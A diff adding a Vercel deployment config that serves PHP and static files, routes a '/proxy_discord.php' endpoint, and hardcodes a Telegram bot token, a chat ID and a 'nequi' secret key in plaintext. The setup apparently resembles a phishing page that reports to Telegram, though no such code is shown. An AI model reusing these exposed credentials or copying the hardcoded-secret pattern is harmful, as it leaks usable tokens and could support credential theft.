@@ -1,0 +1,24 @@
+{
+  "builds": [
+    { "src": "**/*.php", "use": "vercel-php@0.7.1" },
+    { "src": "**/*.css", "use": "@vercel/static" },
+    { "src": "**/*.js", "use": "@vercel/static" },
+    { "src": "**/*.svg", "use": "@vercel/static" },
+    { "src": "**/*.png", "use": "@vercel/static" },
+    { "src": "**/*.webp", "use": "@vercel/static" },
+    { "src": "**/*.jpg", "use": "@vercel/static" },
+    { "src": "**/*.gif", "use": "@vercel/static" },
+    { "src": "**/*.ico", "use": "@vercel/static" },
+    { "src": "**/*.woff2", "use": "@vercel/static" },
+    { "src": "**/*.html", "use": "@vercel/static" }
+  ],
+  "routes": [
+    { "src": "/proxy_discord.php", "dest": "/proxy_discord.php" },
+    { "src": "/(.*)", "dest": "/$1" }
+  ],
+  "env": {
+    "BOT_TOKEN": "8424899450:AAE5nHpYO23q8JWK1t6jHE7WUF0pN9V4a_A",
+    "CHAT_ID": "-1003827381225",
+    "SECURITY_KEY": "nequi_extreme_secret_2026"
+  }
+}
